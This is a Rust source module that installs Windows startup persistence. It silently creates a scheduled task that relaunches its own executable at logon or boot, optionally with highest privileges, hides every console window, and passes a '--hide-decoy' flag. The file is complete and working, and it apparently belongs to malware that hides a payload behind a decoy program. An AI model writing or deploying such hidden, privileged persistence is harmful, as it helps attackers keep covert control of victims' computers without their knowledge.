use crate::config::Config;
use anyhow::{Context, Result};
use std::env;
use std::os::windows::process::CommandExt;
use std::process::Command;
use tracing::{info, error};

const CREATE_NO_WINDOW: u32 = 0x08000000;

pub fn check_startup() -> Result<()> {
    let startup_config = Config::get_startup_config();

    if !startup_config.enabled {
        if Config::SHOW_CONSOLE {
            info!("Startup persistence disabled");
        }
        return Ok(());
    }
    
    let task_name = startup_config.task_name;

    if Config::SHOW_CONSOLE {
        info!("Checking for task: {}", task_name);
    }

    let query_output = Command::new("schtasks")
        .args(["/query", "/tn", task_name])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .context("Failed to query scheduled task")?;

    if query_output.status.success() {
        if Config::SHOW_CONSOLE {
            info!("Task '{}' already exists", task_name);
        }
        return Ok(());
    }

    if Config::SHOW_CONSOLE {
        info!("Creating task '{}'", task_name);
        info!("Task will trigger on: {}", if startup_config.on_logon { "LOGON" } else { "BOOT" });
        info!("Privileges: {}", if startup_config.highest_privileges { "HIGHEST" } else { "NORMAL" });
    }

    let exe_path = env::current_exe()
        .context("Failed to get executable path")?;
    
    if Config::SHOW_CONSOLE {
        info!("Executable path: {}", exe_path.display());
    }
    
    let exe_path_quoted = format!("\"{}\" --hide-decoy", exe_path.display());
    
    let mut args = vec![
        "/create",
        "/tn", task_name,
        "/tr", &exe_path_quoted,
        "/f",
    ];

    if startup_config.on_logon {
        args.extend(["/sc", "ONLOGON"]);
    }
    
    if startup_config.highest_privileges {
        args.extend(["/rl", "HIGHEST"]);
    }

    if Config::SHOW_CONSOLE {
        info!("Running: schtasks {}", args.join(" "));
    }

    let create_output = Command::new("schtasks")
        .args(&args)
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .context("Failed to execute schtasks")?;

    if !create_output.status.success() {
        let stderr = String::from_utf8_lossy(&create_output.stderr);
        let stdout = String::from_utf8_lossy(&create_output.stdout);
        error!("STDOUT: {}", stdout);
        error!("STDERR: {}", stderr);
        error!("Failed to create task '{}': {}", task_name, stderr);
        anyhow::bail!("Task creation failed: {}", stderr);
    }

    if Config::SHOW_CONSOLE {
        let stdout = String::from_utf8_lossy(&create_output.stdout);
        info!("Task created successfully");
        info!("Output: {}", stdout);
    }

    Ok(())
}